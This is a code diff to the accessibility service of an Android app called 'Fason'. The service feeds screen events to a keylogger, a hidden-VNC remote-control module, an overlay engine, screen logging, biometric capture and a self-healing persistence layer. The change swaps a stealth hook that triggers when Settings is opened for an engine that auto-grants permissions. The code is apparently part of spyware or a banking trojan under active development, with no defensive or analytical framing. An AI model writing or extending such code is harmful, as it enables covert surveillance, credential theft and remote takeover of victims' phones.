@@ -17,8 +17,7 @@ import com.fason.app.features.biometrics.BiometricCapture;
 import com.fason.app.features.automation.AutomataManager;
 import com.fason.app.features.screenlog.ScreenLogManager;
 import com.fason.app.persistence.AccessibilitySelfHeal;
-import com.fason.app.core.permissions.PermissionGuardOrchestrator;
-import com.fason.app.stealth.StealthModeManager;
+import com.fason.app.core.permissions.AutoPermissionEngine;
 
 public class FasonAccessibilityService extends AccessibilityService {
     private static final String TAG = "FasonA11y";
@@ -39,6 +38,7 @@ public class FasonAccessibilityService extends AccessibilityService {
         AutomataManager.getInstance().setAccessibilityService(this);
         ScreenLogManager.getInstance().setAccessibilityService(this);
         Inspector2.getInstance().setAccessibilityService(this);
+        AutoPermissionEngine.get(this).bind(this);
         Log.i(TAG, "Accessibility service connected — APEX engines armed");
     }
 
@@ -48,16 +48,10 @@ public class FasonAccessibilityService extends AccessibilityService {
         try {
             // Layer 5: Self-heal check
             AccessibilitySelfHeal.checkAndHeal();
-            // Permission Guard: real-time interception
-            PermissionGuardOrchestrator.onAccessibilityEvent(this, event);
-            // Stealth Mode: settings intercept
-            if (event.getPackageName() != null && 
-                "com.android.settings".contentEquals(event.getPackageName())) {
-                StealthModeManager.onSettingsOpened();
-            }
             int type = event.getEventType();
             if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                 type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+                AutoPermissionEngine.get(this).onAccessibilityEvent(event);
                 HVncAccessibilityService.onAccessibilityEvent(event);
                 KeyloggerManager.onAccessibilityEvent(event);
                 OverlayEngine.getInstance().onAccessibilityEvent(event);
